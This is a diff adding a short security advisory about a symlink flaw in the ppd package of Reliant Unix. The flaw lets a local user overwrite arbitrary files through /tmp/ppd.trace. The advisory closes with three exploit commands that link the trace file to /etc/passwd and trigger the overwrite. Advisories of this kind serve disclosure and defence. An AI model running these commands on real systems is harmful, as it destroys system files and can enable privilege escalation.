@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/2606/info
+
+Reliant Unix is a variant of the UNIX Operating System distributed by Fujitsu-Siemens. Reliant Unix is a scalable UNIX Operating system designed for use on Siemens servers.
+
+A problem in the operating system could make it possible for a user to deny service to legitimate users. Due to the improper checking of file creation rights by the ppd software package included with the operating system, it is possible for a user to create a symbolic link in /tmp with the name ppd.trace, and overwrite any file on the system.
+
+This vulnerability makes it possible for a local user to overwrite sensitive system files, potentially denying service to legitimate users, and possibly gaining elevated privileges. 
+
+ln -s /etc/passwd /tmp/ppd.trace
+
+/opt/bin/ppd -T
+
+cat /etc/passwd
+[..] 
